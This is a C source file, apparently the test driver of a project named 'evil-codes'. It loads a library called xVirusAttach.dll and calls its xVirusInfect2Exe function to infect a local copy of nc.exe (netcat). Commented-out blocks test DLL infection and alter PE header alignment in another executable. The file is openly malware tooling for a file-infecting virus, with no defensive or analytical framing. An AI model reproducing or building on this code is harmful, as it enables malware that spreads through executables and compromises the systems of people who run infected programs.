#include "Common.h"
#include "Support.h"
#include "xVirusAttach.h"

#define __XVIRUS_ATTACH_DLL_PATH__			_T("E:\\logic\\projects\\evil-codes\\bin\\xVirusAttach.dll")
__integer main(__char *pArgv[], __integer iArgc) {
	HMODULE hAttach = NULL;
	FPxVirusInsertPlugin pInsertPlugin = NULL;
	FPxVirusInfect2Dll pInfect2Dll = NULL;
	FPxVirusInfect2Exe pInfect2Exe = NULL;

	//{
	//	__integer iSize = 0;
	//	__memory pMem = MappingFile(_T("E:\\logic\\projects\\evil-codes\\bin\\mt.exe"), &iSize, TRUE, 0, 0);
	//	PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)pMem;
	//	PIMAGE_NT_HEADERS pNtHdr = __GetNtHeader__(pMem);
	//	pNtHdr->OptionalHeader.FileAlignment = pNtHdr->OptionalHeader.SectionAlignment;
	//	UnMappingFile(pMem);
	//}
	hAttach = LoadLibrary(__XVIRUS_ATTACH_DLL_PATH__);
	pInsertPlugin = (FPxVirusInsertPlugin)GetProcAddress(hAttach, "xVirusInsertPlugin");
	//pInfect2Dll = (FPxVirusInfect2Dll)GetProcAddress(hAttach, "xVirusInfect2Dll");
	pInfect2Exe = (FPxVirusInfect2Exe)GetProcAddress(hAttach, "xVirusInfect2Exe");
	pInfect2Exe(_T("E:\\logic\\projects\\evil-codes\\bin\\nc.exe"), NULL);
	//pInfect2Dll(_T("E:\\logic\\projects\\evil-codes\\bin\\TestDll.dll"));
	//{
	//	HMODULE hTestDll = NULL;
	//	DWORD dwFuckTest = 0;
	//	hTestDll = LoadLibrary(_T("E:\\logic\\projects\\evil-codes\\bin\\TestDll.dll"));
	//	dwFuckTest = (DWORD)GetProcAddress(hTestDll, "FuckTest");
	//	FreeLibrary(hTestDll);
	//}
	return 1;
}
